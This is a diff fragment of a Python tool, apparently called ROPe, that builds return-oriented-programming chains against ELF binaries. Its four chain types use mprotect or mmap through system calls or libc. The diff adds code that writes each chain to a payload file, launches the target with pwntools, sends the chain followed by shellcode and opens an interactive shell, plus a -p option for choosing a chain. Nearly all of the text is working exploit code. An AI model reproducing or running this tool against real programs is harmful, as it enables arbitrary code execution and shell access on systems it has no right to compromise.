+                print(f"{Colors.BOLD}{Colors.WHITE}*** Attempting ROP payload execution on {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET} (^D to exit shell)")
+                p = process([filename])
+                #p = process(["gdb", filename])
+                #p.sendline("break poc.c:8")
+                #p.sendline("run")
+                p.sendline(bytes(res))
+                #p.interactive()
+                p.sendline(bytes(shellcode))
+                p.interactive()
+                p.close()
+            except Exception as err:
+                print(f"{Colors.BOLD}*** {Colors.RED}ERROR: {err}")
 
+    # Try libc-mprotect chain
+    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}libc-mprotect{Colors.GREY} chain...")
+    res = None
+    if target_ropchain is None or target_ropchain == "3":
+        if has_libc is True:
+            res = build_libc_mprotect(filename)
+        else:
+            print(f"{Colors.BOLD}{Colors.RED}libc not found! Skipping chain...{Colors.RESET}{Colors.GREY}")
+    if res is not None:
+        print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}libc-mprotect{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
+        if disable_file_output is False:
+            fn = filename[filename.rfind("/")+1:]
+            write_payload(f"{fn}-libc-mprotect-payload.ROPe", res)
+        if disable_exec is False:
+            try:
+                print(f"{Colors.BOLD}{Colors.WHITE}*** Attempting ROP payload execution on {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET} (^D to exit shell)")
+                p = process([filename])
+                #p = process(["gdb", filename])
+                #p.sendline("break vuln.c:8")
+                #p.sendline("run")
+                p.sendline(bytes(res))
+                #p.interactive()
+                p.sendline(bytes(shellcode))
+                p.interactive()
+                p.close()
+            except Exception as err:
+                print(f"{Colors.BOLD}*** {Colors.RED}ERROR: {err}")
 
-# Prints out the generated payload in a human-readable format (hex-encoded string)
+    # Try libc-mmap chain
+    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}libc-mmap{Colors.GREY} chain...")
+    res = None
+    if target_ropchain is None or target_ropchain == "4":
+        if has_libc is True:
+            res = build_libc_mmap(filename)
+        else:
+            print(f"{Colors.BOLD}{Colors.RED}libc not found! Skipping chain...{Colors.RESET}{Colors.GREY}")
+    if res is not None:
+        print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}libc-mmap{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET} (^D to exit shell)")
+        if disable_file_output is False:
+            fn = filename[filename.rfind("/")+1:]
+            write_payload(f"{fn}-libc-mmap-payload.ROPe", res)
+        if disable_exec is False:
+            try:
+                print(f"{Colors.BOLD}{Colors.WHITE}*** Attempting ROP payload execution on {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
+                p = process([filename])
+                #p = process(["gdb", filename])
+                #p.sendline("break poc.c:8")
+                #p.sendline("run")
+                p.sendline(bytes(res))
+                #p.interactive()
+                p.sendline(bytes(shellcode))
+                p.interactive()
+                p.close()
+            except Exception as err:
+                print(f"{Colors.BOLD}*** {Colors.RED}ERROR: {err}")
+
+# Outputs the payload to a file, in raw format.
+# This can be examined w/ `xxd` later on, converted or encoded to
+# some other form, or fed as input to the executable.
 def write_payload(filename, payload):
-    outf = open(filename, "wb+")
+    global disable_file_output
+    if disable_file_output is True:
+        return
+
+    outf = open(filename, "wb")
     outf.write(payload)
     outf.close()
     print(f"{Colors.BOLD}{Colors.WHITE}ROP Chain stored in: \'{Colors.YELLOW}{filename}{Colors.WHITE}\'{Colors.RESET}")
@@ -762,10 +1098,24 @@ def write_payload(filename, payload):
 # Main ROPe function
 def ROPe():
     # parse arguments
-    parser = argparse.ArgumentParser(description="Automatically generate a ROP chain suitable for executing a third party payload.")
+    parser = argparse.ArgumentParser(
+            formatter_class = argparse.RawDescriptionHelpFormatter,
+            description=('''\
+Automatically generate a ROP chain suitable for executing a third party payload.
+
+Four possible ROP chains are provided. By default, this tool will attempt to
+build and execute each of them in sequence. You may specify a particular target
+ROP chain to build by combinging the -p option with one of the following:
+            
+    Paylods:
+        1 - mprotect->read chain using system calls
+        2 - mprotect->read chain using libc calls
+        3 - mmap->read chain using system calls
+        4 - mmap->read chain using libc calls'''))
     parser.add_argument('-v', action='store_true', help='enable verbose output')
     parser.add_argument('-x', action='store_true', help='do not attempt to launch process with ROP payload')
     parser.add_argument('-d', action='store_true', help='do not write generated payloads out as files')
+    parser.add_argument('-p', nargs="?", help='specified which payload to build.')
     parser.add_argument('files', nargs='+', help='list of ELFs to examine (must be in $PATH, or absolute paths)')
     args = parser.parse_args()
 
@@ -783,6 +1133,11 @@ def ROPe():
         global disable_file_output
         disable_file_output = True
         debug("disable_file_output: True")
+
+    if args.p:
+        global target_ropchain
+        target_ropchain = args.p
+        debug(f"target_rop_chain: {target_ropchain}")
 
     if args.files:
         global files
